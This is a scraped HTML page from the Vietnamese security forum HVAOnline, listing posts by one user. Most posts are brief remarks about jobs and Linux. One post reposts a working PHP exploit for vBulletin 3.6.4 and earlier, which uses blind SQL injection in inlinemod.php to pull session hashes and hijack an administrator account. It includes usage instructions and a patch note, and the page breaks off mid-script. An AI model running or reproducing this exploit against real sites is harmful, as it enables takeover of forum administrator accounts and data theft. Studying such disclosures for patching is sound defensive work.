<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by anh_that_tinh, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by anh_that_tinh - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.html?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="" title="[Logo]">
								<img src="/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.html"><img src="/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.html">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.html">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.html">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.html"><img src="/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.html">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.html"><img src="/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.html">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.html"><img src="/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.html"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.html">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.html"><img src="/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.html">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.html">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.html', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/20676.html" name="top" class="maintitle" id="top">Messages posted by: anh_that_tinh</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/20676.html"><img src="/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/20676.html">Profile for anh_that_tinh</a> 
            			<img src="/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/20676.html">Messages posted by anh_that_tinh</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">6</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/44.html">Người tìm việc - Việc tìm người</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/38649.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/38649/236930.html#236930,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Tuyển các chú biết hack vào không sợ quạy banh cty hả pác ^_^.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/21.html">Thảo luận việc định hướng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/33873.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/33873/208431.html#208431,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Mình cũng đồng tình với WinDak là bạn nên chọn học cái gì bạn thấy thích thì tốt hơn.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/44.html">Người tìm việc - Việc tìm người</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/23367.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/23367/185867.html#185867,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Phải chi ở HCM thì tốt biết mấy hix hix.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/44.html">Người tìm việc - Việc tìm người</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/28809.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/28809/185866.html#185866,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Hình như chủ topic post rồi bỏ rơi topic luôn thì phải.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/24.html">Thảo luận hệ điều hành *nix</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/21614.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/21614/128929.html#128929,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Có thể vào trong terminal gõ "sudo -i" để chuyển sang quyền root.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/21.html">Thảo luận việc định hướng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/7913.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/7913/46122.html#46122,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Quá đã.Bây giờ thì phải rèn luyện thêm vốn ngoại ngử mới đc.<br/> Thêm 1 vài link hot nửa<br/> http://www.vietnamnet.vn/cntt/2005/11/512351/<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/7565.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/7565/44082.html#44082,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">vBulletin &lt;= 3.6.4 (inlinemod.php postids) Remote SQL Injection Exploit<br/><br/> <span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?php
print_r&#40;'
-----------------------------------------------------------------------------
vBulletin &lt;= 3.6.4 inlinemod.php "postids" sql injection / privilege
escalation by session hijacking exploit
by rgod
mail: retrog at alice dot it
site:<span class="link"> http://retrogod.altervista.org</span>
Works regardless of php.ini settings, you need a Super Moderator account
to copy posts among threads, to be launched while admin is logged in to
the control panel, this will give you full admin privileges
note: this will flood the forum with empty threads even!
-----------------------------------------------------------------------------
'&#41;;
if &#40;$argc&lt;7&#41; {
print_r&#40;'
-----------------------------------------------------------------------------
Usage: php '.$argv&#91;0&#93;.' host path user pass forumid postid OPTIONS
host: target server &#40;ip/hostname&#41;
path: path to vbulletin
user/pass: you need a moderator account
forumid: existing forum
postid: existing post
Options:
-p&#91;port&#93;: specify a port other than 80
-P&#91;ip:port&#93;: specify a proxy
Example:
php '.$argv&#91;0&#93;.' localhost /vbulletin/ rgod mypass 2 121 -P1.1.1.1:80
php '.$argv&#91;0&#93;.' localhost /vbulletin/ rgod mypass 1 143 -p81
-----------------------------------------------------------------------------
'&#41;;
die;
}
/*
vulnerable code in inlinemod.php near lines 185-209:
...
case 'docopyposts':
$vbulletin-&gt;input-&gt;clean_array_gpc&#40;'p', array&#40;
'postids' =&gt; TYPE_STR,
&#41;&#41;;
$postids = explode&#40;',', $vbulletin-&gt;GPC&#91;'postids'&#93;&#41;;
foreach &#40;$postids AS $index =&gt; $postid&#41;
{
if &#40;$postids&#91;"$index"&#93; != intval&#40;$postid&#41;&#41;
{
unset&#40;$postids&#91;"$index"&#93;&#41;;
}
}
if &#40;empty&#40;$postids&#41;&#41;
{
eval&#40;standard_error&#40;fetch_error&#40;'no_applicable_posts_selected'&#41;&#41;&#41;;
}
if &#40;count&#40;$postids&#41; &gt; $postlimit&#41;
{
eval&#40;standard_error&#40;fetch_error&#40;'you_are_limited_to_working_with_x_posts', $postlimit&#41;&#41;&#41;;
}
break;
...
when an element of $postids array is not an integer, it fails to unset&#40;&#41; the proper value.
An example:
&lt;?php
$foo&#91;1&#93;="99999&#41; UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*";
$foo&#91;2&#93;=intval&#40;$foo&#91;1&#93;&#41;;
echo $foo&#91;1&#93;."\n";
echo $foo&#91;2&#93;."\n";
if &#40;$foo&#91;1&#93; != $foo&#91;2&#93;&#41;
{
echo "they are different";
}
else
{
echo "they match!";
}
?&gt;
output:
99999&#41; UNION SELECT foo FROM foo WHERE foo=1 LIMIT 1/*
99999
they match!
this because when php tries to comparise a string with an integer
it tries to convert the string in its integer value, it chooses the first integer chars
of the string itself!
so unset&#40;&#41; never run!
the result is sql injection near lines 3792-3800:
...
$posts = $db-&gt;query_read_slave&#40;"
SELECT post.postid, post.threadid, post.visible, post.title, post.username, post.dateline, post.parentid, post.userid,
thread.forumid, thread.title AS thread_title, thread.postuserid, thread.visible AS thread_visible, thread.firstpostid,
thread.sticky, thread.open, thread.iconid
FROM " . TABLE_PREFIX . "post AS post
LEFT JOIN " . TABLE_PREFIX . "thread AS thread USING &#40;threadid&#41;
WHERE postid IN &#40;" . implode&#40;',', $postids&#41; . "&#41;
ORDER BY post.dateline
"&#41;;
...
this exploit extract various session hashes from the database
to authenticate as admin and to change the privileges of a registered user
I could not find a way to see results inside html, so this asks true/false
questions to the database, copying posts around threads
possible patch, replace:
foreach &#40;$postids AS $index =&gt; $postid&#41;
{
if &#40;$postids&#91;"$index"&#93; != intval&#40;$postid&#41;&#41;
{
unset&#40;$postids&#91;"$index"&#93;&#41;;
}
}
with:
foreach &#40;$postids AS $index =&gt; $postid&#41;
{
$postids&#91;"$index"&#93;=&#40;int&#41;$postids&#91;"$index"&#93;;
}
and, some line before:
foreach &#40;$threadids AS $index =&gt; $threadid&#41;
{
if &#40;$threadids&#91;"$index"&#93; != intval&#40;$threadid&#41;&#41;
{
unset&#40;$threadids&#91;"$index"&#93;&#41;;
}
}
with:
foreach &#40;$threadids AS $index =&gt; $threadid&#41;
{
$threadids&#91;"$index"&#93;=&#40;int&#41;$threadids&#91;"$index"&#93;;
}
vendor was contacted by email form...
*/
error_reporting&#40;7&#41;;
ini_set&#40;"max_execution_time",0&#41;;
ini_set&#40;"default_socket_timeout",5&#41;;
function quick_dump&#40;$string&#41;
{
$result='';$exa='';$cont=0;
for &#40;$i=0; $i&lt;=strlen&#40;$string&#41;-1; $i++&#41;
{
if &#40;&#40;ord&#40;$string&#91;$i&#93;&#41; &lt;= 32 &#41; | &#40;ord&#40;$string&#91;$i&#93;&#41; &gt; 126 &#41;&#41;
{$result.=" .";}
else
{$result.=" ".$string&#91;$i&#93;;}
if &#40;strlen&#40;dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;&#41;==2&#41;
{$exa.=" ".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
else
{$exa.=" 0".dechex&#40;ord&#40;$string&#91;$i&#93;&#41;&#41;;}
$cont++;if &#40;$cont==15&#41; {$cont=0; $result.="\r\n"; $exa.="\r\n";}
}
return $exa."\r\n".$result;
}
$proxy_regex = '&#40;\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b&#41;';
function sendpacketii&#40;$packet&#41;
{
global $proxy, $host, $port, $html, $proxy_regex;
if &#40;$proxy==''&#41; {
$ock=fsockopen&#40;gethostbyname&#40;$host&#41;,$port&#41;;
if &#40;!$ock&#41; {
echo 'No response from '.$host.':'.$port; die;
}
}
else {
$c = preg_match&#40;$proxy_regex,$proxy&#41;;
if &#40;!$c&#41; {
echo 'Not a valid proxy...';die;
}
$parts=explode&#40;':',$proxy&#41;;
echo "Connecting to ".$parts&#91;0&#93;.":".$parts&#91;1&#93;." proxy...\r\n";
$ock=fsockopen&#40;$parts&#91;0&#93;,$parts&#91;1&#93;&#41;;
if &#40;!$ock&#41; {
echo 'No response from proxy...';die;
}
}
fputs&#40;$ock,$packet&#41;;
if &#40;$proxy==''&#41; {
$html='';
while &#40;!feof&#40;$ock&#41;&#41; {
$html.=fgets&#40;$ock&#41;;
}
}
else {
$html='';
while &#40;&#40;!feof&#40;$ock&#41;&#41; or &#40;!eregi&#40;chr&#40;0x0d&#41;.chr&#40;0x0a&#41;.chr&#40;0x0d&#41;.chr&#40;0x0a&#41;,$html&#41;&#41;&#41; {
$html.=fread&#40;$ock,1&#41;;
}
}
fclose&#40;$ock&#41;;
}
$host=$argv&#91;1&#93;;
$path=$argv&#91;2&#93;;
$user=$argv&#91;3&#93;;
$pass=md5&#40;$argv&#91;4&#93;&#41;;
$forumid=&#40;int&#41;$argv&#91;5&#93;;
$existing_post=&#40;int&#41;$argv&#91;6&#93;;
$port=80;
$proxy="";
for &#40;$i=3; $i&lt;$argc; $i++&#41;{
$temp=$argv&#91;$i&#93;&#91;0&#93;.$argv&#91;$i&#93;&#91;1&#93;;
if &#40;&#40;$temp&lt;&gt;"-p"&#41; and &#40;$temp&lt;&gt;"-P"&#41;&#41; {$cmd.=" ".$argv&#91;$i&#93;;}
if &#40;$temp=="-p"&#41;
{
$port=str_replace&#40;"-p","",$argv&#91;$i&#93;&#41;;
}
if &#40;$temp=="-P"&#41;
{
$proxy=str_replace&#40;"-P","",$argv&#91;$i&#93;&#41;;
}
}
if &#40;&#40;$path&#91;0&#93;&lt;&gt;'/'&#41; or &#40;$path&#91;strlen&#40;$path&#41;-1&#93;&lt;&gt;'/'&#41;&#41; {echo 'Error... check the path!'; die;}
if &#40;$proxy==''&#41; {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
$data="vb_login_username=$user";
$data.="&vb_login_password=";
$data.="&s=";
$data.="&do=login";
$data.="&vb_login_md5password=$pass";
$data.="&vb_login_md5password_utf=$pass";
$packet="POST ".$p."login.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."login.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
$cookie="";
$temp=explode&#40;"Set-Cookie: ",$html&#41;;
for &#40;$i=1; $i&lt;count&#40;$temp&#41;; $i++&#41;
{
$temp2=explode&#40;" ",$temp&#91;$i&#93;&#41;;
$cookie.=" ".trim&#40;$temp2&#91;0&#93;&#41;;
}
//echo "your cookie -&gt; ".$cookie."\n\n";
if &#40;!eregi&#40;"sessionhash",$cookie&#41;&#41;{die&#40;"failed to login..."&#41;;}$temp=str_replace&#40;" ","",$cookie&#41;;$temp=str_replace&#40;"sessionhash","",$temp&#41;;
$temp=str_replace&#40;"lastvisit","",$temp&#41;;$temp=str_replace&#40;"lastactivity","",$temp&#41;;$temp=explode&#40;"=",$temp&#41;;$temp=explode&#40;";",$temp&#91;1&#93;&#41;;
$cookie_prefix=trim&#40;$temp&#91;1&#93;&#41;;echo "cookie prefix -&gt; ".$cookie_prefix."\n";
$chars&#91;0&#93;=0;//null
$chars=array_merge&#40;$chars,range&#40;48,57&#41;&#41;; //numbers
$j=1;$uid="";
echo "admim user id -&gt; ";
while &#40;!strstr&#40;$uid,chr&#40;0&#41;&#41;&#41;
{
for &#40;$i=0; $i&lt;=255; $i++&#41;
{
if &#40;in_array&#40;$i,$chars&#41;&#41;
{
$data ="s=";
$data.="&do=docopyposts";
$data.="&destforumid=$forumid";
$data.="&title=suntzu";
$data.="&forumid=$forumid";
$data.="&postids=9999999&#41;/**/UNION/**/SELECT/**/&#40;IF&#40;&#40;ASCII&#40;SUBSTRING&#40;userid,".$j.",1&#41;&#41;=".$i."&#41;,$existing_post,-999999&#41;&#41;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/usergroupid=6/**/LIMIT/**/1/*";
$packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
$temp=explode&#40;"showthread.php?t=",$html&#41;;
$temp2=explode&#40;"\n",$temp&#91;1&#93;&#41;;
$thread=&#40;int&#41;$temp2&#91;0&#93;;
$packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"You have an error in your SQL syntax",$html&#41;&#41;{echo $html; die&#40;"\nunknown query error..."&#41;;}
if &#40;eregi&#40;"join date",$html&#41;&#41; {$uid.=chr&#40;$i&#41;;echo chr&#40;$i&#41;; sleep&#40;1&#41;; break;}
}
if &#40;$i==255&#41; {
die&#40;"\nExploit failed..."&#41;;
}
}
$j++;
}
if &#40;trim&#40;$uid&#41;==""&#41;{die&#40;"\nExploit failed..."&#41;;}else{echo "\nvulnerable!";}
$uid=intval&#40;$uid&#41;;
function my_encode&#40;$my_string&#41;
{
$encoded="CHAR&#40;";
for &#40;$k=0; $k&lt;=strlen&#40;$my_string&#41;-1; $k++&#41;
{
$encoded.=ord&#40;$my_string&#91;$k&#93;&#41;;
if &#40;$k==strlen&#40;$my_string&#41;-1&#41; {$encoded.="&#41;";}
else {$encoded.=",";}
}
return $encoded;
}
$j=1;$my_uid="";
echo "\nyour user id -&gt; ";
while &#40;!strstr&#40;$my_uid,chr&#40;0&#41;&#41;&#41;
{
for &#40;$i=0; $i&lt;=255; $i++&#41;
{
if &#40;in_array&#40;$i,$chars&#41;&#41;
{
$data ="s=";
$data.="&do=docopyposts";
$data.="&destforumid=$forumid";
$data.="&title=suntzu";
$data.="&forumid=$forumid";
$data.="&postids=9999999&#41;/**/UNION/**/SELECT/**/&#40;IF&#40;&#40;ASCII&#40;SUBSTRING&#40;userid,".$j.",1&#41;&#41;=".$i."&#41;,$existing_post,-999999&#41;&#41;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/username=".my_encode&#40;$user&#41;."/**/LIMIT/**/1/*";
$packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"You have an error in your SQL syntax",$html&#41;&#41;{echo $html; die&#40;"\nunknown query error..."&#41;;}
$temp=explode&#40;"showthread.php?t=",$html&#41;;
$temp2=explode&#40;"\n",$temp&#91;1&#93;&#41;;
$thread=&#40;int&#41;$temp2&#91;0&#93;;
$packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"join date",$html&#41;&#41; {$my_uid.=chr&#40;$i&#41;;echo chr&#40;$i&#41;; sleep&#40;1&#41;; break;}
}
if &#40;$i==255&#41; {
die&#40;"\nExploit failed..."&#41;;
}
}
$j++;
}
$my_uid=intval&#40;$my_uid&#41;;
$chars&#91;0&#93;=0;//null
$chars=array_merge&#40;$chars,range&#40;48,57&#41;&#41;; //numbers
$chars=array_merge&#40;$chars,range&#40;97,102&#41;&#41;;//a-f letters
$j=1;$sess_hash="";
echo "\nsession hash -&gt; ";
while &#40;!strstr&#40;$sess_hash,chr&#40;0&#41;&#41;&#41;
{
for &#40;$i=0; $i&lt;=255; $i++&#41;
{
if &#40;in_array&#40;$i,$chars&#41;&#41;
{
$data ="s=";
$data.="&do=docopyposts";
$data.="&destforumid=$forumid";
$data.="&title=suntzu";
$data.="&forumid=$forumid";
$data.="&postids=9999999&#41;/**/UNION/**/SELECT/**/&#40;IF&#40;&#40;ASCII&#40;SUBSTRING&#40;sessionhash,".$j.",1&#41;&#41;=".$i."&#41;,$existing_post,-999999&#41;&#41;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/session/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
$packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
